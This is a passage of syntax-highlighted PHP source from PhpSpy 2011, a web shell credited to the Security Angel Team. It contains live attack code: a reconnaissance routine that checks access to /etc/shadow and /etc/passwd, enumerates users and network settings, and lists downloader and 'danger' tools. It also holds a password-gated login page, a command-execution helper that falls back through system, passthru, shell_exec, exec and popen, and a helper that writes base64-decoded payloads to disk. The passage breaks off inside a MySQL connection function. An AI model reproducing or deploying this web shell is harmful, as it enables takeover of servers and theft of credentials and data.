        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;yes&quot;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;yes&quot;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span>
        <span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
                <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span>
            <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Mount options&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/fstab&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span>
        <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;IP Configurate&#39;</span><span class="p">,</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;ipconfig -all&#39;</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span><span class="c1">//end</span>

<span class="k">else</span> <span class="p">{</span>
    <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Undefined Action&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;div style=&quot;padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;&quot;&amp;gt;</span>
<span class="x">    &amp;lt;span style=&quot;float:right;&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="nx">debuginfo</span><span class="p">();</span><span class="nb">ob_end_flush</span><span class="p">();</span><span class="cp">?&gt;</span><span class="x">&amp;lt;/span&amp;gt;</span>
<span class="x">    Powered by &amp;lt;a title=&quot;Build 20110502&quot; href=&quot;http://www.4ngel.net&quot; target=&quot;_blank&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;P.h.p.S.p.y&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"> 2011&amp;lt;/a&amp;gt;. Copyright (C) 2004-2011 &amp;lt;a href=&quot;http://www.4ngel.net&quot; target=&quot;_blank&quot;&amp;gt;Security Angel Team [S4T]&amp;lt;/a&amp;gt; All Rights Reserved.</span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;/body&amp;gt;</span>
<span class="x">&amp;lt;/html&amp;gt;</span>

<span class="cp">&lt;?php</span>

<span class="cm">/*======================================================</span>
<span class="cm">º¯Êý¿â</span>
<span class="cm">======================================================*/</span>

<span class="k">function</span> <span class="nf">secparam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39; &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;div class=&quot;infolist&quot;&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
            <span class="nx">p</span><span class="p">(</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br /&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">m</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div style=&quot;margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;&quot;&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">scookie</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$life</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$prefix</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$timestamp</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">,</span> <span class="nv">$cookiepre</span><span class="p">,</span> <span class="nv">$cookiedomain</span><span class="p">,</span> <span class="nv">$cookiepath</span><span class="p">,</span> <span class="nv">$cookielife</span><span class="p">;</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$prefix</span> <span class="o">?</span> <span class="nv">$cookiepre</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="nv">$key</span><span class="p">;</span>
    <span class="nv">$life</span> <span class="o">=</span> <span class="nv">$life</span> <span class="o">?</span> <span class="nv">$life</span> <span class="o">:</span> <span class="nv">$cookielife</span><span class="p">;</span>
    <span class="nv">$useport</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_PORT&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">443</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$timestamp</span><span class="o">+</span><span class="nv">$life</span><span class="p">,</span> <span class="nv">$cookiepath</span><span class="p">,</span> <span class="nv">$cookiedomain</span><span class="p">,</span> <span class="nv">$useport</span><span class="p">);</span>
<span class="p">}</span>    
<span class="k">function</span> <span class="nf">multi</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="nv">$perpage</span><span class="p">,</span> <span class="nv">$curpage</span><span class="p">,</span> <span class="nv">$tablename</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$multipage</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$perpage</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$page</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
        <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="nv">$pages</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ceil</span><span class="p">(</span><span class="nv">$num</span> <span class="o">/</span> <span class="nv">$perpage</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$from</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$pages</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$curpage</span> <span class="o">-</span> <span class="nv">$offset</span><span class="p">;</span>
            <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$curpage</span> <span class="o">+</span> <span class="nv">$page</span> <span class="o">-</span> <span class="nv">$offset</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$from</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$curpage</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">-</span> <span class="nv">$from</span><span class="p">;</span>
                <span class="nv">$from</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="k">if</span><span class="p">((</span><span class="nv">$to</span> <span class="o">-</span> <span class="nv">$from</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$page</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$to</span> <span class="o">-</span> <span class="nv">$from</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$page</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$to</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$curpage</span> <span class="o">-</span> <span class="nv">$pages</span> <span class="o">+</span> <span class="nv">$to</span><span class="p">;</span>
                <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$pages</span><span class="p">;</span>
                <span class="k">if</span><span class="p">((</span><span class="nv">$to</span> <span class="o">-</span> <span class="nv">$from</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$page</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$to</span> <span class="o">-</span> <span class="nv">$from</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$pages</span> <span class="o">-</span> <span class="nv">$page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$multipage</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$curpage</span> <span class="o">-</span> <span class="nv">$offset</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$pages</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$page</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;\&#39;, 1);&quot;&amp;gt;First&amp;lt;/a&amp;gt; &#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$curpage</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">1</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;\&#39;, &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$curpage</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&quot;&amp;gt;Prev&amp;lt;/a&amp;gt; &#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$from</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span> <span class="nv">$to</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$multipage</span> <span class="o">.=</span> <span class="nv">$i</span> <span class="o">==</span> <span class="nv">$curpage</span> <span class="o">?</span> <span class="nv">$i</span><span class="o">.</span><span class="s1">&#39; &#39;</span> <span class="o">:</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;\&#39;, &#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;);&quot;&amp;gt;[&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;]&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$multipage</span> <span class="o">.=</span> <span class="p">(</span><span class="nv">$curpage</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;\&#39;, &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$curpage</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&quot;&amp;gt;Next&amp;lt;/a&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$to</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span> <span class="o">?</span> <span class="s1">&#39; &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;\&#39;, &#39;</span><span class="o">.</span><span class="nv">$pages</span><span class="o">.</span><span class="s1">&#39;);&quot;&amp;gt;Last&amp;lt;/a&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="nv">$multipage</span> <span class="o">=</span> <span class="nv">$multipage</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;p&amp;gt;Pages: &#39;</span><span class="o">.</span><span class="nv">$multipage</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$multipage</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// µÇÂ½Èë¿Ú</span>
<span class="k">function</span> <span class="nf">loginpage</span><span class="p">()</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
<span class="x">    input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}</span>
<span class="x">    &amp;lt;/style&amp;gt;</span>
<span class="x">    &amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;</span>
<span class="x">    &amp;lt;span style=&quot;font:11px Verdana;&quot;&amp;gt;Password: &amp;lt;/span&amp;gt;&amp;lt;input name=&quot;password&quot; type=&quot;password&quot; size=&quot;20&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;login&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span><span class="c1">//end loginpage()</span>

<span class="k">function</span> <span class="nf">execute</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$cfe</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
            <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
            <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
            <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
            <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">,</span><span class="nv">$res</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$res</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$res</span> <span class="o">.=</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span> 
            <span class="p">}</span>
            <span class="o">@</span><span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$pr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">execute</span><span class="p">(</span><span class="s2">&quot;which </span><span class="si">$pr</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">return</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">?</span> <span class="nv">$path</span> <span class="o">:</span> <span class="nv">$pr</span><span class="p">);</span> 
<span class="p">}</span>

<span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="nv">$text</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">dirsize</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span> 
    <span class="nv">$dh</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
    <span class="nv">$size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!=</span> <span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">;</span>
            <span class="nv">$size</span> <span class="o">+=</span> <span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">?</span> <span class="nx">dirsize</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">:</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// Ò³Ãæµ÷ÊÔÐÅÏ¢</span>
<span class="k">function</span> <span class="nf">debuginfo</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$starttime</span><span class="p">;</span>
    <span class="nv">$mtime</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span>
    <span class="nv">$totaltime</span> <span class="o">=</span> <span class="nb">number_format</span><span class="p">((</span><span class="nv">$mtime</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$mtime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="nv">$starttime</span><span class="p">),</span> <span class="mi">6</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s1">&#39;Processed in &#39;</span><span class="o">.</span><span class="nv">$totaltime</span><span class="o">.</span><span class="s1">&#39; second(s)&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//Á¬½ÓMYSQLÊý¾Ý¿â</span>
<span class="k">function</span> <span class="nf">mydbconn</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span><span class="nv">$dbuser</span><span class="p">,</span><span class="nv">$dbpass</span><span class="p">,</span><span class="nv">$dbname</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$charset</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$dbport</span><span class="o">=</span><span class="s1">&#39;3306&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$charsetdb</span><span class="p">;</span>
    <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;mysql.connect_timeout&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$dbhost</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$dbport</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Can not connect to MySQL server&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$link</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbname</span><span class="p">)</span> <span class="p">{</span>
